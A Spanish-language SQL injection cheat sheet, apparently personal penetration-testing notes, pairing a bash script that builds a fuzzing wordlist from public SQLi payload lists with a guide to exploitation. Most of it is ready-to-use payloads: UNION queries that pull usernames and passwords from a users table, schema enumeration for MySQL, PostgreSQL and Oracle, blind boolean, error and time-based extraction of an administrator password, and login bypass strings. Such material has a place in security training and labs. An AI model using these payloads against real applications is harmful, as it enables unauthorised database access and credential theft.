# SQLi
```bash
# SecLists
wget "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt"
wget "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/SQLi/Generic-SQLi.txt"
wget "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/SQLi/quick-SQLi.txt"
wget "https://raw.githubusercontent.com/PenTestical/sqli/refs/heads/main/hugeSQL.txt"
wget "https://raw.githubusercontent.com/PenTestical/sqli/refs/heads/main/unionboss.txt"

cat *.txt | sort -u > sqli_wl.txt

# se añaden payloads de order by
seq 1 20 | xargs -I{} echo "' ORDER BY {}-- -" >> sqli_wl.txt

# añadimos payloads de union select para oracle:                           
echo "' UNION SELECT null from dual-- -" >> sqli_wl.txt 
echo "' UNION SELECT null,null from dual-- -" >> sqli_wl.txt 
echo "' UNION SELECT null,null,null from dual-- -" >> sqli_wl.txt 
echo "' UNION SELECT null,null,null,null from dual-- -" >> sqli_wl.txt 
echo "' UNION SELECT null,null,null,null,null from dual-- -" >> sqli_wl.txt 
echo "' UNION SELECT null,null,null,null,null,null from dual-- -" >> sqli_wl.txt 
echo "' UNION SELECT null,null,null,null,null,null,null from dual-- -" >> sqli_wl.txt 
echo "' UNION SELECT @@version#" >> sqli_wl.txt 
echo "' UNION SELECT @@version,null#" >> sqli_wl.txt 
echo "' UNION SELECT @@version,null,null#" >> sqli_wl.txt 
echo "' UNION SELECT @@version,null,null,null#" >> sqli_wl.txt 
echo "' UNION SELECT @@version,null,null,null,null#" >> sqli_wl.txt 

echo "' AND '1'='1" >> sqli_wl.txt

printf '%s\n' {a..z} {A..Z} {0..9} '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '=' '_' '+' > charset.txt

printf '%s\n' {a..z} {A..Z} {0..9} > charset.txt

# todos los caracteres en ascii
for i in $(seq 32 126); do printf "\\$(printf '%03o' $i)\n"; done > charset.txt

printf '%s\n' {0..99} > num.txt



# se añade " " por "+"
while IFS= read -r line; do
    echo "$line"
    echo "${line// /+}"
done < sqli_wl.txt > temp.txt && mv temp.txt sqli_wl.txt

# se añade " " por "%20"
while IFS= read -r line; do
    echo "$line"
    echo "${line// /%20}"
done < sqli_wl.txt > temp.txt && mv temp.txt sqli_wl.txt

# sustituimos ' por %27
while IFS= read -r line; do
    echo "$line"
    echo "${line//\'/%27}"
done < sqli_wl.txt > temp.txt && mv temp.txt sqli_wl.txt

# se añade las mods de admin por administrator
while IFS= read -r line; do
    echo "$line"
    echo "${line//admin/administrator}"
done < sqli_wl.txt > temp.txt && mv temp.txt sqli_wl.txt

cat sqli_wl.txt | sort -u | tee sqli_wl.txt
```




# Guía Completa de SQL Injection (SQLi)

## 1. Introducción
El SQL Injection (SQLi) es una vulnerabilidad de seguridad que permite a un atacante manipular consultas SQL de una aplicación web para acceder, modificar o eliminar información en la base de datos. A continuación, se presentan diversas técnicas y ejemplos para explotar esta vulnerabilidad.

---

## 2. Identificación de SQLi
### 2.1. Detectar la vulnerabilidad
Podemos probar si una aplicación es vulnerable inyectando caracteres especiales que pueden generar errores o comportamientos anormales:
```sql
' -- Provoca un error de sintaxis si la entrada es vulnerable
" OR 1=1 -- Prueba si la lógica de autenticación es vulnerable
'or%201=1%20--%20- (URL encoded)
```
Si la aplicación devuelve errores o cambia su comportamiento, es posible que sea vulnerable.

---

## 3. SQL Injection en Diferentes Partes de la Consulta
La mayoría de las vulnerabilidades de SQLi ocurren dentro de la cláusula `WHERE` de una consulta `SELECT`. Sin embargo, pueden aparecer en otros lugares de la consulta, incluyendo:

- **En sentencias UPDATE**, dentro de los valores actualizados o en la cláusula `WHERE`.
- **En sentencias INSERT**, dentro de los valores insertados.
- **En sentencias SELECT**, dentro del nombre de la tabla o columna.
- **En sentencias SELECT**, dentro de la cláusula `ORDER BY`.

Esto significa que cualquier parte de una consulta SQL que procese datos de entrada puede ser potencialmente vulnerable a SQLi.

---

## 4. Ataques SQLi con UNION
### 4.1. Determinar el número de columnas
Para explotar UNION, primero debemos conocer la cantidad de columnas que devuelve la consulta original:
```sql
' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--  
```
Cuando obtenemos un error, significa que hemos superado el número de columnas disponibles.

Otra opción es usar NULL para descubrir el número correcto de columnas:
```sql
' UNION SELECT NULL--  
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--
```

### 4.2. Determinar el tipo de datos de cada columna
Para determinar qué columnas aceptan texto:
```sql
' UNION SELECT 'a',NULL,NULL--  
' UNION SELECT NULL,'a',NULL--  
```
Si una consulta devuelve un error, significa que la columna no acepta strings.

### 4.3. Obtener información de otras tablas
```sql
' UNION SELECT username, password FROM users--
```

Para recuperar varios valores en una sola columna:
```sql
' UNION SELECT username || ':' || password FROM users--
```

### 4.4. Listado de bases de datos y tablas
- **MySQL & PostgreSQL:**
```sql
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```
- **Oracle:**
```sql
' UNION SELECT table_name FROM all_tables--
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

### 4.5. Determinar la versión de la base de datos
- **MySQL & SQL Server:**
```sql
' UNION SELECT @@version--
```
- **Oracle:**
```sql
' UNION SELECT banner FROM v$version--
```

---

## 5. Blind SQL Injection (SQLi Ciego)
Cuando no obtenemos una respuesta directa, podemos inferir datos mediante respuestas condicionales.

### 5.1. Inyección basada en respuestas condicionales
```sql
' AND '1'='1 -- (Devuelve resultado)
' AND '1'='2 -- (No devuelve resultado)
```
Para extraer datos:
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm'--
```
Si la aplicación responde distinto según la condición, podemos determinar caracter por caracter.

### 5.2. Inducción de errores para extracción de datos
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Si la aplicación devuelve un error, la condición es verdadera.

Para extraer caracteres de la contraseña:
```sql
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE 'a' END)='a
```

### 5.3. SQLi basado en demoras de tiempo
Si la base de datos admite funciones de demora, podemos usar:
```sql
' OR pg_sleep(5)-- (PostgreSQL)
' OR SLEEP(5)-- (MySQL)
' OR WAITFOR DELAY '00:00:05'-- (SQL Server)
```
Si la aplicación se ralentiza, la consulta fue ejecutada.

---

## 6. Bypass de autenticación mediante SQLi
```sql
' OR 1=1--
" OR ""="
admin' --
```
Estas inyecciones permiten iniciar sesión sin necesidad de contraseña.

---

## 7. Herramientas y Recursos
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- Burp Suite, SQLmap, etc.

---

Esta guía proporciona una referencia rápida y estructurada para identificar y explotar vulnerabilidades SQLi en distintas bases de datos. ¡Utilizar con responsabilidad! 🚀

